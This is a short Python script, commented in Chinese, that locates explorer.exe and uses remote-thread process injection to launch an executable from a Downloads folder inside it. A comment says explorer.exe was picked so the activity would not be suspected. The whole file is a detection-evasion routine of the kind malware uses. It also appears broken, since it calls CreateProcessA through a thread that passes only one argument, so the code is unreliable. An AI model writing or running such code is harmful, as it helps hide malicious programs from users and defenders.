import win32api
import win32process
import win32con
import ctypes

# 目标进程（这里选择explorer.exe，系统核心进程，不易被怀疑）
def get_explorer_pid():
    for proc in win32process.EnumProcesses():
        try:
            handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, proc)
            exe_name = win32process.GetModuleFileNameEx(handle, 0)
            if "explorer.exe" in exe_name.lower():
                win32api.CloseHandle(handle)
                return proc
        except:
            continue
    return None

# 注入1.exe到目标进程
def inject_exe(target_pid, exe_path):
    kernel32 = ctypes.WinDLL("kernel32.dll")
    # 打开目标进程
    h_process = kernel32.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, target_pid)
    if not h_process:
        raise Exception("无法打开目标进程")
    
    # 在目标进程中分配内存，写入exe路径
    buf_size = len(exe_path) + 1
    lp_base_addr = kernel32.VirtualAllocEx(h_process, None, buf_size, win32con.MEM_COMMIT, win32con.PAGE_READWRITE)
    kernel32.WriteProcessMemory(h_process, lp_base_addr, exe_path.encode("gbk"), buf_size, None)
    
    # 创建远程线程，执行1.exe
    lp_start_addr = kernel32.GetProcAddress(kernel32.GetModuleHandleA("kernel32.dll"), "CreateProcessA")
    kernel32.CreateRemoteThread(h_process, None, 0, lp_start_addr, lp_base_addr, 0, None)
    kernel32.CloseHandle(h_process)

# 执行注入
if __name__ == "__main__":
    pid = get_explorer_pid()
    if pid:
        inject_exe(pid, "C:\\Users\\pengj\\Downloads\\1.exe")
    else:
        print("未找到explorer.exe进程")